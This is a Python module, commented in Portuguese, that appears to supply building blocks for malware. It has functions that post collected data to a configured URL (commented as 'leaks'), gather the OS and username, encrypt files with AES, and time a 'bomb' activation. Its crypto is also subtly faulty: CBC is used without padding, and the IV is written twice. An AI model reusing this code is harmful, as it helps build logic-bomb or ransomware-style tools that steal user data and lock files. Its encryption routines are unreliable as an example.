import os
import requests
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import platform
import getpass
from config import *


def fetch_data(api_url: str) -> dict: # Captura dados do endpoint(fiz pensando na vulnerabilidade de um projeto que criei)
    response = requests.get(api_url)
    response.raise_for_status()
    return response.json()

def send_data(data: dict, url: str): # Vazamentos
    response = requests.post(url, json=data)
    response.raise_for_status()

def derive_key(pw: str, salt: bytes) -> bytes: # Gera chave a partir de uma senha e seu salt
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(pw.encode())

def encrypt_file(file_path: str, key: bytes) -> bytes: # Encripta o arquivo
    with open(file_path, 'rb') as f:
        data = f.read()

    iv = os.urandom(16)
    cipher = Cipher(
        algorithms.AES(key),
        modes.CBC(iv),
        backend=default_backend()
    )
    encryptor = cipher.encryptor()
    ct = encryptor.update(data) + encryptor.finalize()
    return iv + ct

def save_backup(file_path: str, iv: bytes, encrypted_data: bytes, key: bytes):
    os.makedirs(BACKUP_DIR, exist_ok=True)
    backup_file_path = os.path.join(BACKUP_DIR, os.path.basename(file_path) + '.enc')

    with open(backup_file_path, 'wb') as f:
        f.write(iv + encrypted_data)
    
    with open(backup_file_path + '.key', 'wb') as f:
        f.write(key)
    
def collect_system_info():
    return {
        'os': platform.system(),
        'version': platform.version(),
        'user': getpass.getuser()
    }

def check_activation(bomb_activation_time: str) -> bool: # Condicionador
    import datetime
    current_time = datetime.datetime.now()
    activation_time = datetime.datetime.strptime(bomb_activation_time, "%Y-%m-%d %H:%M:%S")
    
    if current_time >= activation_time:
        return True
    else:
        return False

def wait_for_activation(bomb_delay: int):
    import time
    time.sleep(bomb_delay)